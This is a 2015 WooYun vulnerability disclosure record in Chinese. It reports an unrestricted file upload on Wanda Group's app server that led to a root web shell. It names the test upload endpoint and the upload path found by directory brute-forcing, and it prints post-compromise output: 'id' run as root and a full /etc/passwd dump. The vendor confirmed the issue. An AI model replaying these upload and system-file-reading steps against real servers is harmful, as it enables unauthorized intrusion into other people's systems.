{"id": 45458, "wybug_id": "wooyun-2015-095844", "wybug_title": "万达集团app云端主站getshell影响官网及内网（第二弹）", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "zzR", "wybug_date": "2015-02-05 17:44", "wybug_open_date": "2015-03-22 17:46", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查", "你猜"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向公众公开  简要描述： 换了个姿势，再来一次了另外，昨晚去万达影院看电影的呢-0- 详细说明：  http://wooyun.org/bugs/wooyun-2010-089653  之前的方式，是转移了web后台，好吧，找不到了。但是这次好像又找到了另外一个接口，另外加上rp爆发，还是getshell 了还是找入口，dirbuster 告诉我还有些接口可以访问\nhttp://app.wanda.cn/todo/test/addCheckUpdate.jsp\n \n\n是个更新app的页面，这是个test入口，但是好像还能直通生产环境，没整明白你们怎么搞的。上传吧，没有任何的限制，也提示成功了，但是没有返回路径，没有显示。（其实，后来看前一个getshell时候的图片，也能看出路径了，唉）   漏洞证明：  试了\nhttp://app.wanda.cn/todo/\n页面的所有连接，发现最上面有个wanda_share，\nwanda_share(remoteAddr:10.199.10.11 and localAddr:10.199.82.29 and remoteHost:10.199.10.11)\n好吧，加个wanda_share、share、wanda这样的目录，还是找不到，想app更新，有没有个app或者apk或者ios的路径，ok，弄了个小字典，加上看电影的动力，在吃了几个苹果后的午后，找到了路径 /share/apk/  ,并且关键一点，文件名称没有改变，费了老多劲，还是挤进来了。\n\n\nmnt/jituanyidongkehuduan/share/share/apk>iduid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_java_t:s0-s0:c0.c1023\n\n/usr/local/isoftstone/apache-tomcat-7.0.57/bin>cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsaslauth:x:498:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinpulse:x:497:496:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinadmin:x:800:800::/home/admin:/bin/bashappuser:x:801:801::/home/appuser:/bin/bashnagios:x:810:810::/home/nagios:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsre:x:811:999::/home/sre:/bin/bash\n   修复方案：  还会有嘛？   版权声明：转载请注明来源 zzR@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-02-05 22:19 厂商回复： 感谢zzR同学的关注与贡献！马上通知业务整改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-05 18:11 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  前排、、    \n     2015-02-14 16:22 |    \t\twifi \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:2        | 这厮真懒……)\t\t \n  这是和万达杠上了啊    \n     2015-03-23 12:49 |    \t\t庞德 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:9        | 求各种指点.)\t\t \n  可否指点下dirbuster的用法?    \n     2015-05-18 11:00 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @庞德 把域名扔进去，选择一个字典， go  即可    \n     2015-07-05 19:53 |    \t\tchavez_wang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 走过你来时的路)\t\t \n  @zzR 求大神来份字典    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}